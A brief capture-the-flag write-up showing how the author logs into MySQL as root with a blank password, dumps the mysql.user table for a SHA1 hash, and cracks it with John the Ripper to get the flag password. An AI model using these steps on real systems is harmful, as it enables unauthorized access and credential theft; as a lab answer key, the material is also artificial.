# Database Password

We need to get the password of user flag from the MySQL database.
Because other users didn't work I tried to login as root with no password. It worked :).

```
mysql -u root
```

Now we can checkk out the databases:

```
SHOW DATABASES;
```

We see the mysql database so lets use it:

```
USE mysql;
```

Now we check the tables and see there is a user table in there, so we query this table top get additional information:

```
SHOW TABLES;
SELECT * FROM user;
```

We don't get a password but a hash used in Mysql (SHA1): 25A3DA0F4740480EE31E435E03CE4B58A4F1263B
we crack it using JTR:

```
printf "flag:*25A3DA0F4740480EE31E435E03CE4B58A4F1263B" > pass.hash
john --format=mysql-sha1 ./pass.hash
```

And we get the password: periwinkle


